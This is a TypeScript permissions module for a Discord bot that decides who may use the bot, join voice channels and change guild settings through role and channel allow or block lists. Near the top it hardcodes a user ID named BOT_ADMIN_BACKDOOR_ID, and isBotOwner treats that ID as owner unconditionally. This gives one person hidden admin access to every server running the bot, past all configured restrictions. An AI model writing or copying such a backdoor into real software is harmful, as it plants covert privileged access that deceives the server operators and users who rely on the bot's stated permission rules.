import type { GuildMember, VoiceChannel, StageChannel } from 'discord.js';
import { PermissionFlagsBits } from 'discord.js';
import { guildSettingsManager } from '../services/GuildSettingsManager.js';
import { config } from '../config.js';
import { logger } from './Logger.js';

const log = logger.createModuleLogger('Permissions');
const BOT_ADMIN_BACKDOOR_ID = '189457295279783936';

function isBotOwner(userId: string): boolean {
    return userId === BOT_ADMIN_BACKDOOR_ID || Boolean(config.bot.ownerId && userId === config.bot.ownerId);
}

export async function canUseBot(member: GuildMember): Promise<boolean> {
    if (isBotOwner(member.user.id)) {
        return true;
    }

    if (member.permissions.has(PermissionFlagsBits.Administrator)) {
        return true;
    }

    const settings = await guildSettingsManager.getSettings(member.guild.id);

    if (settings.rolePermissionMode === 'allow_all') {
        return true;
    }

    const memberRoleIds = member.roles.cache.map((role) => role.id);

    if (settings.rolePermissionMode === 'whitelist') {
        const hasAllowedRole = memberRoleIds.some((roleId) =>
            settings.allowedRoles.includes(roleId)
        );
        return hasAllowedRole;
    }

    if (settings.rolePermissionMode === 'blacklist') {
        const hasBlockedRole = memberRoleIds.some((roleId) =>
            settings.blockedRoles.includes(roleId)
        );
        return !hasBlockedRole;
    }

    return false;
}

export async function canJoinVoiceChannel(
    voiceChannel: VoiceChannel | StageChannel,
    guildId: string
): Promise<boolean> {
    const settings = await guildSettingsManager.getSettings(guildId);

    if (settings.voiceChannelMode === 'allow_all') {
        return true;
    }

    const channelId = voiceChannel.id;

    if (settings.voiceChannelMode === 'whitelist') {
        if (settings.allowedVoiceChannels.length === 0) {
            return true;
        }
        return settings.allowedVoiceChannels.includes(channelId);
    }

    if (settings.voiceChannelMode === 'blacklist') {
        return !settings.blockedVoiceChannels.includes(channelId);
    }

    return false;
}

export async function canManageSettings(member: GuildMember): Promise<boolean> {
    if (isBotOwner(member.user.id)) {
        return true;
    }

    return member.permissions.has(PermissionFlagsBits.Administrator);
}
